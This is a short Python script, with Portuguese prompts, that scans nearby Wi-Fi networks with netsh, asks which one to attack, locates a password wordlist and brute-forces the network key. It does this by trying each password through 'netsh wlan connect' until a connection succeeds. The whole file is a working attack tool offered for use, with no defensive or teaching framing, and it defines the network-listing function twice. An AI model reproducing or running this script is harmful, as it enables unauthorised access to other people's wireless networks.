import subprocess
import re
import os

def listar_redes():
    redes = []
    resultado = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'], capture_output=True, text=True, encoding='utf-8', errors='ignore')
    linhas = resultado.stdout.split('\n')
    
    for linha in linhas:
        match = re.search(r'SSID \d+ : (.+)', linha)
        if match:
            redes.append(match.group(1))
    
    return redes

def listar_redes():
    redes = []
    resultado = subprocess.run(['netsh', 'wlan', 'show', 'networks', 'mode=bssid'], capture_output=True, text=True)
    linhas = resultado.stdout.split('\n')
    
    for linha in linhas:
        match = re.search(r'SSID \d+ : (.+)', linha)
        if match:
            redes.append(match.group(1))
    
    return redes

def escolher_rede(redes):
    print("\nRedes Disponiveis:")
    for i, rede in enumerate(redes):
        print(f"[{i}] {rede}")
    
    while True:
        try:
            escolha = int(input("\nEscolha o numero da rede para o ataque: "))
            if 0 <= escolha < len(redes):
                return redes[escolha]
            else:
                print("Escolha invalida. Tente novamente.")
        except ValueError:
            print("Entrada invalida. Digite um numero.")

def encontrar_wordlist():
    nomes_comuns = ["wordlist.txt", "senhas.txt", "passwords.txt"]
    diretorios = [".", "wordlists", "C:\\Users\\Public\\wordlists", "E:\\wordlist.txt"]
    
    for diretorio in diretorios:
        for nome in nomes_comuns:
            caminho = os.path.join(diretorio, nome)
            if os.path.exists(caminho):
                print(f"Wordlist encontrada: {caminho}")
                return caminho
    
    return input("Nenhuma wordlist encontrada. Digite o caminho da wordlist: ")

def ataque_bruteforce(ssid, wordlist):
    print(f"\nIniciando ataque a rede {ssid}...")
    try:
        with open(wordlist, 'r', encoding='utf-8', errors='ignore') as arquivo:
            for senha in arquivo:
                senha = senha.strip()
                comando = ['netsh', 'wlan', 'connect', f'name={ssid}', f'key={senha}']
                resultado = subprocess.run(comando, capture_output=True, text=True, encoding='utf-8', errors='ignore')
                
                if "conectado" in resultado.stdout.lower():
                    print(f"\n[SUCESSO] Senha encontrada: {senha}")
                    return senha
                else:
                    print(f"[X] Tentativa falhou: {senha}")
    except FileNotFoundError:
        print("Erro: Wordlist nao encontrada.")
    
    print("\nNenhuma senha funcionou.")
    return None

if __name__ == "__main__":
    redes = listar_redes()
    if not redes:
        print("Nenhuma rede encontrada.")
    else:
        ssid_escolhido = escolher_rede(redes)
        wordlist_path = encontrar_wordlist()
        ataque_bruteforce(ssid_escolhido, wordlist_path)
